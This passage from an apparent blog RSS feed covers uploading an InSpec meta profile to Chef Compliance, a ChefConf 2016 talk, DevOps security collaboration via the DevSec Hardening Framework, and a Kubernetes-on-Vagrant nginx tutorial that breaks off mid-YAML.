I, [2016-12-06T10:24:44.194607 #90853]  INFO -- : Finished archive generation.
Start upload to admin/acme-inspec-profile
Uploading to Chef Compliance
Successfully uploaded profile
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The profile is available in Chef Compliance now:&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;img src=&quot;/articles/chef-compliance-meta-profiles/cc-meta-profile-fs8.png&quot; alt=&quot;The meta profile is available in Chef Compliance&quot; title=&quot;Meta profile in Chef Compliance&quot; width=&quot;700px&quot;&gt;&lt;/center&gt;&lt;/p&gt;

&lt;h3 id=&quot;upload-of-archive-via-chef-compliance-web-ui&quot;&gt;Upload of archive via Chef Compliance Web UI&lt;/h3&gt;
&lt;p&gt;In cases, where you cannot upload the profile via CLI, you have to archive the profile manually. At first you trigger the vendoring process via &lt;code&gt;inspec vendor&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ inspec vendor acme-inspec-profile
Vendor dependencies of acme-inspec-profile into acme-inspec-profile/vendor
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once the vendoring process is done, the &lt;code&gt;vendor&lt;/code&gt; directory and the &lt;code&gt;inspec.lock&lt;/code&gt; are placed in the &lt;code&gt;acme-inspec-profile&lt;/code&gt; directory. Now, run &lt;code&gt;inspec archive&lt;/code&gt; to generate a package.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ inspec archive acme-inspec-profile
I, [2016-12-06T10:32:59.234327 #93241]  INFO -- : Checking profile in acme-inspec-profile
I, [2016-12-06T10:32:59.234422 #93241]  INFO -- : Metadata OK.
`command(ssh).exist?` is not suported on your OS:
I, [2016-12-06T10:32:59.376949 #93241]  INFO -- : Found 126 controls.
W, [2016-12-06T10:32:59.377156 #93241]  WARN -- : Control verify-kb has no description
W, [2016-12-06T10:32:59.377181 #93241]  WARN -- : Control important-count has no description
W, [2016-12-06T10:32:59.377199 #93241]  WARN -- : Control important-patches has no description
W, [2016-12-06T10:32:59.377214 #93241]  WARN -- : Control important-patches has no tests defined
W, [2016-12-06T10:32:59.377225 #93241]  WARN -- : Control optional-count has no description
W, [2016-12-06T10:32:59.377235 #93241]  WARN -- : Control optional-patches has no description
W, [2016-12-06T10:32:59.377243 #93241]  WARN -- : Control optional-patches has no tests defined
W, [2016-12-06T10:32:59.377253 #93241]  WARN -- : Control verify-patches has no description
W, [2016-12-06T10:32:59.377262 #93241]  WARN -- : Control patches has no description
W, [2016-12-06T10:32:59.377277 #93241]  WARN -- : Control patches has no tests defined
W, [2016-12-06T10:32:59.377294 #93241]  WARN -- : Control tls1.2 has no description
W, [2016-12-06T10:32:59.377329 #93241]  WARN -- : Control tls1.2 has no tests defined
W, [2016-12-06T10:32:59.377339 #93241]  WARN -- : Control ssl2 has no description
W, [2016-12-06T10:32:59.377392 #93241]  WARN -- : Control ssl2 has no tests defined
W, [2016-12-06T10:32:59.377408 #93241]  WARN -- : Control ssl3 has no description
W, [2016-12-06T10:32:59.377419 #93241]  WARN -- : Control ssl3 has no tests defined
W, [2016-12-06T10:32:59.377429 #93241]  WARN -- : Control tls1.0 has no description
W, [2016-12-06T10:32:59.377441 #93241]  WARN -- : Control tls1.0 has no tests defined
W, [2016-12-06T10:32:59.377480 #93241]  WARN -- : Control tls1.1 has no description
W, [2016-12-06T10:32:59.377536 #93241]  WARN -- : Control tls1.1 has no tests defined
W, [2016-12-06T10:32:59.377567 #93241]  WARN -- : Control rc4 has no description
W, [2016-12-06T10:32:59.377586 #93241]  WARN -- : Control rc4 has no tests defined
I, [2016-12-06T10:32:59.378081 #93241]  INFO -- : Generate archive /Users/chartmann/Development/compliance/inspec/acme-inspec-profile.tar.gz.
I, [2016-12-06T10:32:59.486476 #93241]  INFO -- : Finished archive generation.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;center&gt;&lt;img src=&quot;/articles/chef-compliance-meta-profiles/cc-manual-upload-fs8.png&quot; alt=&quot;Upload the profile to Chef Compliance&quot; title=&quot;Profile Upload Chef Compliance&quot; width=&quot;700px&quot;&gt;&lt;/center&gt;&lt;/p&gt;

&lt;h3 id=&quot;scan-a-node&quot;&gt;Scan a node&lt;/h3&gt;
&lt;p&gt;Voilà, the profile is available in Chef Compliance:&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;img src=&quot;/articles/chef-compliance-meta-profiles/cc-profile-fs8.png&quot; alt=&quot;Browse the profile in Chef Compliance&quot; title=&quot;View profile details in Chef Compliance&quot; width=&quot;700px&quot;&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;The profile can be selected for remote scans via the Chef Compliance dashboard:&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;img src=&quot;/articles/chef-compliance-meta-profiles/cc-scan-fs8.png&quot; alt=&quot;Trigger a scan in Chef Compliance&quot; title=&quot;Trigger scan in Chef Compliance&quot; width=&quot;700px&quot;&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;Once the scan is done, you’ll see a report including controls from all dependent profiles:&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;img src=&quot;/articles/chef-compliance-meta-profiles/cc-scanresult-fs8.png&quot; alt=&quot;The meta profile is available in Chef Compliance&quot; title=&quot;Meta profile in Chef Compliance&quot; width=&quot;700px&quot;&gt;&lt;/center&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;We’ve seen how meta profiles are defined and executed. The new meta profile mechanism makes it easy for users to define complex scenarios and manage profile deviations in an easy and understandable way. Inline with the InSpec philosophy, everything is defined as &lt;code&gt;Compliance as Code&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let me know how that works for you!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ChefConf 2016 - Save Your Crash Dummies!</title>
      <link>http://lollyrock.com/articles/chefconf2016-save-your-crash-dummies/</link>
      <pubDate>Thu, 11  Aug 2016 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/chefconf2016-save-your-crash-dummies/</guid>
      <author></author>
      <description>&lt;p&gt;With infrastructure and application automation we have gained the tools to change systems in the blink of an eye. However, with increasing size, complexity, and time, these components will inevitably challenge your expectations. This uncertainty will ultimately slow you down. This talk will introduce the workflow to gain back trust.&lt;/p&gt;
&lt;h2 id=&quot;a-test-driven-infrastructure-solution&quot;&gt;A Test-driven Infrastructure Solution&lt;/h2&gt;
&lt;p&gt;This talk will cover the foundation of effective infrastructure tests and failure domains for isolation. Moreover, we will look into the management of divergent environments, from legacy systems to modern clouds. This talk will combine Delivery, InSpec, and Test-Kitchen in intensely mixed deployments.&lt;/p&gt;
&lt;iframe width=&quot;640&quot; height=&quot;360&quot; src=&quot;https://www.youtube-nocookie.com/embed/LUKhcf2e-GM&quot; frameborder=&quot;0&quot; allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;The slides are available at &lt;a href=&quot;http://lollyrock.com/slides/2016-chefconf-save-your-crash-dummies&quot;&gt;http://lollyrock.com/slides/2016-chefconf-save-your-crash-dummies&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>DevOps and Security</title>
      <link>http://lollyrock.com/articles/devops-security/</link>
      <pubDate>Thu, 18 Jun 2015 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/devops-security/</guid>
      <author></author>
      <description>&lt;p&gt;To ensure the security of your IT services, different disciplines need to come together. Development, operations and security departments need to work hand in hand in order to ship a secure product. Every department has its core competencies and it is a challenge to create a common view on the security implementation for a product.&lt;/p&gt;
&lt;h2 id=&quot;the-challenge&quot;&gt;The challenge&lt;/h2&gt;
&lt;p&gt;The separation of knowledge between departments has its advantages but comes with some disadvantages. Quite often, the separation leads to an environment where different departments have different goals:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dev teams are under pressure to ship the product&lt;/li&gt;
&lt;li&gt;ops teams need to ensure everything runs smoothly&lt;/li&gt;
&lt;li&gt;security teams have to ensure that the new product is secure&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since extensive technical know-how is required to ship a product (and even more is required to ship a successful product), every party needs to understand and breath the whole product delivery process and every aspect of the implementation need to be well known. On top of that, each department has to deal with different artifacts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;source code (developers)&lt;/li&gt;
&lt;li&gt;packages &amp;amp; runtime (ops)&lt;/li&gt;
&lt;li&gt;regularities, pen-tests (security)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In a static world, this would not be an issue, but since the velocity of technology increases, the shipment of each artifacts need to synchronized in order to ship a product in time. The question is, how departments are able deliver a product together by focusing on their core competency?&lt;/p&gt;
&lt;h2 id=&quot;find-the-same-language&quot;&gt;Find the same language&lt;/h2&gt;
&lt;p&gt;About two years ago, we faced the challenge mentioned above and it got us thinking? From our perspective, the current delivery process was broken. Would there be a better approach? Could we use new technologies to speed up the development and time-to-market, as well as help departments to work more effectively together?&lt;/p&gt;
&lt;p&gt;We identified a few patterns:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Security teams need a way to describe their rules without the need of extensive programming skills&lt;/li&gt;
&lt;li&gt;Developers need an automated way to deal with security configuration&lt;/li&gt;
&lt;li&gt;Operations need a deterministic and manageable software&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In a small team of four (&lt;a href=&quot;http://arlimus.github.io/&quot;&gt;Dominik&lt;/a&gt;, Patrick, &lt;a href=&quot;http://ehaselwanter.com/&quot;&gt;Edmund&lt;/a&gt; and I) worked in an interdisciplinary team with know-how in each area for product delivery and security. We started prototyping, developing, deploying. Eventually, we created a project called &lt;a href=&quot;http://dev-sec.io/&quot;&gt;DevSec Hardening Framework&lt;/a&gt; with Deutsche Telekom. What is special about the Hardening Framework?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Security configuration is documented as code which is great for developers, because they are able to focus on product implementation&lt;/li&gt;
&lt;li&gt;Instead of abstract regularities, we used Serverspec to define tests. This allowed use the tests as a verification mechanism&lt;/li&gt;
&lt;li&gt;All security requirements are automated via a configuration management tool&lt;/li&gt;
&lt;li&gt;The implementation is completely deterministic which is essential for operations&lt;/li&gt;
&lt;li&gt;Security is implemented by design&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In practice, we developed the security test rules first (like):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dev-sec/tests-os-hardening&quot;&gt;https://github.com/dev-sec/tests-os-hardening&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From now on, security teams started developing tests instead of static documents, because those can be re-used across the whole company. E.g. those can be integrated in CI environments or used on local test machines.&lt;/p&gt;
&lt;p&gt;Next, development and operations needed an implementation that automatically remedies failed tests. We implemented the security configuration in Chef, Puppet and Ansible:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dev-sec/chef-os-hardening&quot;&gt;https://github.com/dev-sec/chef-os-hardening&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dev-sec/puppet-os-hardening&quot;&gt;https://github.com/dev-sec/puppet-os-hardening&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dev-sec/ansible-os-hardening&quot;&gt;https://github.com/dev-sec/ansible-os-hardening&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All implementations of the os-hardening module use the same tests. By writing all security requirements as tests rules, we are able to automate tests and increase the velocity of the product delivery. Think of a manufacturing line that has security built-in.&lt;/p&gt;
&lt;h2 id=&quot;take-away&quot;&gt;Take-Away&lt;/h2&gt;
&lt;p&gt;It is essential to address the need of each department to ship a successful product. DevOps tools help companies to align development and operations teams. By defining the common set as regulatory rules, all departments find a way to collaborate more efficiently together and are able integrate security tests into the normal product development workflow.&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://vulcanosec.com/&quot;&gt;Vulcano Security&lt;/a&gt; provides support for security automation, compliance scanning and patch management.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Try Kubernetes with Vagrant</title>
      <link>http://lollyrock.com/articles/kubernetes-vagrant/</link>
      <pubDate>Sun, 31 May 2015 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/kubernetes-vagrant/</guid>
      <author></author>
      <description>&lt;p&gt;To get familiar with kubernetes, it is always good to start with an example. This blog post will setup nginx running on kubernetes.&lt;/p&gt;
&lt;h2 id=&quot;prerequisites-aka-setup-the-cluster&quot;&gt;Prerequisites aka setup the cluster&lt;/h2&gt;
&lt;p&gt;Before we are able to start, we need to download kubernetes and install the command line. To prepare the setup:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;install &lt;a href=&quot;http://www.vagrantup.com/downloads.html&quot;&gt;Vagrant&lt;/a&gt; (&amp;gt;1.6.2)&lt;/li&gt;
&lt;li&gt;install &lt;a href=&quot;https://www.virtualbox.org/wiki/Downloads&quot;&gt;VirtualBox&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Then clone the git repository and set the provider for kubernetes setup scripts &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/GoogleCloudPlatform/kubernetes.git
&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; KUBERNETES_PROVIDER=vagrant
&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; kubernetes
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, we are ready to start the Vagrant cluster. With &lt;code&gt;kube-up.sh&lt;/code&gt; vagrant will provision each machine in the cluster. All necessary components to run kubernetes are installed automatically. By default, each VM is running Fedora as base OS.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ ./cluster/kube-up.sh
Starting cluster using provider: vagrant
... calling verify-prereqs
... calling kube-up

...

Wrote config &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; vagrant to /Users/chris/.kube/config
Each machine instance has been created/updated.
  Now waiting &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; the Salt provisioning process to complete on each machine.
  This can take some time based on your network, disk, and cpu speed.
  It is possible &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; an error to occur during Salt provision of cluster and this could loop forever.
Validating master
Validating minion-1
.....
Waiting &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; each minion to be registered with cloud provider

...

Kubernetes cluster is running.  The master is running at:

  https://10.245.1.2

The user name and password to use is located &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; ~/.kubernetes_vagrant_auth.

... calling validate-cluster
Found 1 nodes.
     1  NAME         LABELS    STATUS
     2  10.245.1.3   &amp;lt;none&amp;gt;    Ready
Validate output:
NAME                 STATUS    MESSAGE   ERROR
controller-manager   Healthy   ok        nil
scheduler            Healthy   ok        nil
etcd-0               Healthy   {&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;get&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt;:{&lt;span class=&quot;string&quot;&gt;&quot;dir&quot;&lt;/span&gt;:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;nodes&quot;&lt;/span&gt;:[{&lt;span class=&quot;string&quot;&gt;&quot;key&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;/registry&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;dir&quot;&lt;/span&gt;:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;modifiedIndex&quot;&lt;/span&gt;:3,&lt;span class=&quot;string&quot;&gt;&quot;createdIndex&quot;&lt;/span&gt;:3}]}}
                     nil
Cluster validation succeeded
Done, listing cluster services:

Kubernetes master is running at https://10.245.1.2
kube-dns is running at https://10.245.1.2/api/v1beta3/proxy/namespaces/default/services/kube-dns
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Verify that kubernetes is running:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ curl --user vagrant:vagrant --insecure https://10.245.1.2/ 
{
  &lt;span class=&quot;string&quot;&gt;&quot;paths&quot;&lt;/span&gt;: [
    &lt;span class=&quot;string&quot;&gt;&quot;/api&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/api/v1beta1&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/api/v1beta2&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/api/v1beta3&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/healthz&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/healthz/ping&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/logs/&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/metrics&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/static/&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/swagger-ui/&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/swaggerapi/&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/validate&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;/version&quot;&lt;/span&gt;
  ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You could also be able to ssh into master and minion:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ vagrant ssh master
$ vagrant ssh minion-1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Further details are available at &lt;a href=&quot;https://github.com/GoogleCloudPlatform/kubernetes/blob/master/docs/getting-started-guides/vagrant.md&quot;&gt;Kubernetes Vagrant Documentation&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;do-some-magic-with-kubernetes-cli&quot;&gt;Do some magic with Kubernetes CLI&lt;/h2&gt;
&lt;p&gt;You could use the &lt;code&gt;cluster/kubectl.sh&lt;/code&gt;, but I find it much easier to install the &lt;code&gt;kubectl&lt;/code&gt; binary. This can be easily done via:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# use mac binary&lt;/span&gt;
$ wget https://storage.googleapis.com/kubernetes-release/release/v0.17.0/bin/darwin/amd64/kubectl -O /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin/kubectl
$ chmod +x /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin/kubectl
$ kubectl version
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, we have the &lt;code&gt;kubectl&lt;/code&gt; command ready for use.&lt;/p&gt;
&lt;h2 id=&quot;start-nginx-cluster-without-pod-definition&quot;&gt;Start Nginx cluster without pod definition&lt;/h2&gt;
&lt;p&gt;This first example uses the docker nginx image and runs it as a cluster. It uses a replica of 3 during bootstrap. Afterwards we change the replica to 2 containers. Finally we destroy all running containers.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Create new nginx cluster&lt;/span&gt;
$ kubectl run-container webserver --image=nginx --replicas=3 --port=80
CONTROLLER   CONTAINER(S)   IMAGE(S)   SELECTOR                  REPLICAS
webserver    webserver      nginx      run-container=webserver   3

&lt;span class=&quot;comment&quot;&gt;# Show all running pods&lt;/span&gt;
$ kubectl get pods &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; run-container=webserver
POD               IP            CONTAINER(S)   IMAGE(S)   HOST                    LABELS                    STATUS    CREATED      MESSAGE
webserver-6de4a   10.246.1.17                             10.245.1.3/10.245.1.3   run-container=webserver   Running   27 seconds   
                                webserver      nginx                                                        Running   25 seconds   
webserver-koxmk   10.246.1.19                             10.245.1.3/10.245.1.3   run-container=webserver   Running   27 seconds   
                                webserver      nginx                                                        Running   24 seconds   
webserver&lt;span class=&quot;_&quot;&gt;-lt&lt;/span&gt;0e9   10.246.1.18                             10.245.1.3/10.245.1.3   run-container=webserver   Running   27 seconds   
                                webserver      nginx                                                        Running   24 seconds   

$ kubectl get replicationControllers &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; run-container=webserver
CONTROLLER   CONTAINER(S)   IMAGE(S)   SELECTOR                  REPLICAS
webserver    webserver      nginx      run-container=webserver   3

&lt;span class=&quot;comment&quot;&gt;# Resize the replica:&lt;/span&gt;
$ kubectl resize rc webserver --replicas=2
resized

$ kubectl get replicationControllers &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; run-container=webserver
CONTROLLER   CONTAINER(S)   IMAGE(S)   SELECTOR                  REPLICAS
webserver    webserver      nginx      run-container=webserver   2

&lt;span class=&quot;comment&quot;&gt;# Show all kube nodes, previously `kubectl get minions`&lt;/span&gt;
$ kubectl get nodes
NAME         LABELS    STATUS
10.245.1.3   &amp;lt;none&amp;gt;    Ready

&lt;span class=&quot;comment&quot;&gt;# Delete running nginx pod with all replicas and services&lt;/span&gt;
$ kubectl stop pods,services &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; run-container=webserver
$ kubectl delete pods,services &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; run-container=webserver
$ kubectl resize rc webserver --replicas=2
pods/webserver-6de4a
pods/webserver-koxmk
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;start-nginx-cluster-with-pods-definition&quot;&gt;Start Nginx cluster with pods definition&lt;/h2&gt;
&lt;p&gt;We define a pod definition &lt;code&gt;01-nginx.yaml&lt;/code&gt; to get nginx up and running. The meta data describes the name and labels of the container. This is required to define selectors for replicas, as we use it later. The &lt;code&gt;containers&lt;/code&gt; define the used docker image. Create the following file:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-yaml&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 01-nginx.yaml&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;apiVersion:&lt;/span&gt; v1beta3
&lt;span class=&quot;attr&quot;&gt;kind:&lt;/span&gt; Pod
&lt;span class=&quot;attr&quot;&gt;metadata:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  name:&lt;/span&gt; www
&lt;span class=&quot;attr&quot;&gt;  labels:&lt;/span&gt; 
&lt;span class=&quot;attr&quot;&gt;    name:&lt;/span&gt; www-nginx
&lt;span class=&quot;attr&quot;&gt;spec:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  containers:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    - name:&lt;/span&gt; nginx
&lt;span class=&quot;attr&quot;&gt;      image:&lt;/span&gt; nginx
&lt;span class=&quot;attr&quot;&gt;      ports:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;        - containerPort:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Load the pod into kubernetes.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Start nginx pod/container&lt;/span&gt;
$ kubectl create &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; 01-nginx.yaml 
pods/www

&lt;span class=&quot;comment&quot;&gt;# Check that nginx is running&lt;/span&gt;
$ kubectl get pods &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; name=www-nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, we adapt the replica by creating a new &lt;code&gt;ReplicationController&lt;/code&gt; definition:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-yaml&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 01-nginx-replica.yaml&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;apiVersion:&lt;/span&gt; v1beta3
&lt;span class=&quot;attr&quot;&gt;kind:&lt;/span&gt; ReplicationController
&lt;span class=&quot;attr&quot;&gt;metadata:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  name:&lt;/span&gt; nginx-controller
&lt;span class=&quot;attr&quot;&gt;spec:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  replicas:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;# selector identifies the set of Pods that this&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;# replication controller is responsible for managing&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  selector:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    name:&lt;/span&gt; www-nginx
  &lt;span class=&quot;comment&quot;&gt;# podTemplate defines the 'cookie cutter' used for creating&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;# new pods when necessary&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  template:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    metadata:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;      name:&lt;/span&gt; www
&lt;span class=&quot;attr&quot;&gt;      labels:&lt;/span&gt;
        &lt;span class=&quot;comment&quot;&gt;# Important: these labels need to match the selector above&lt;/span&gt;
        &lt;span class=&quot;comment&quot;&gt;# The api server enforces this constraint.&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;        name:&lt;/span&gt; www-nginx
&lt;span class=&quot;attr&quot;&gt;    spec:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;      containers:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;        - name:&lt;/span&gt; nginx
&lt;span class=&quot;attr&quot;&gt;          image:&lt;/span&gt; nginx
&lt;span class=&quot;attr&quot;&gt;          ports:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;            - containerPort:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Load the new definition into kubernetes:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Increase replica of the current nginx instances&lt;/span&gt;
$ kubectl create &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; 01-nginx-replica.yaml
replicationcontrollers/nginx-controller

&lt;span class=&quot;comment&quot;&gt;# Check the replica&lt;/span&gt;
$ kubectl get replicationControllers &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; name=www-nginx         
CONTROLLER         CONTAINER(S)   IMAGE(S)   SELECTOR         REPLICAS
nginx-controller   nginx          nginx      name=www-nginx   2

&lt;span class=&quot;comment&quot;&gt;# Verify the connection to the pods&lt;/span&gt;
$ kubectl get pods &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; name=www-nginx                                                                                ✘130 
POD                      IP            CONTAINER(S)   IMAGE(S)   HOST                    LABELS           STATUS    CREATED      MESSAGE
nginx-controller-lfeo7   10.246.1.15                             10.245.1.3/10.245.1.3   name=www-nginx   Running   21 minutes   
                                       nginx          nginx                                               Running   21 minutes   
www                      10.246.1.11                             10.245.1.3/10.245.1.3   name=www-nginx   Running   28 minutes   
                                       nginx          nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You could easily verify that multiple nginx instances are running:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ vagrant ssh minion-1
[vagrant@kubernetes-minion-1 ~]$ curl http://10.246.1.15
[vagrant@kubernetes-minion-1 ~]$ curl http://10.246.1.11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The different containers are not useful by itself. We would like to abstract all instances by a service. Create and load the service definition into kubernetes.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-yaml&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 01-nginx-service.yaml&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;apiVersion:&lt;/span&gt; v1beta3
&lt;span class=&quot;attr&quot;&gt;kind:&lt;/span&gt; Service
&lt;span class=&quot;attr&quot;&gt;metadata:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  name:&lt;/span&gt; nginx-endpoint
&lt;span class=&quot;attr&quot;&gt;  labels:&lt;/span&gt; 
&lt;span class=&quot;attr&quot;&gt;    name:&lt;/span&gt; www-nginx
&lt;span class=&quot;attr&quot;&gt;spec:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  ports:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    - port:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;8000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# the port that this service should serve on&lt;/span&gt;
      &lt;span class=&quot;comment&quot;&gt;# the container on each pod to connect to, can be a name&lt;/span&gt;
      &lt;span class=&quot;comment&quot;&gt;# (e.g. 'www') or a number (e.g. 80)&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;      targetPort:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;
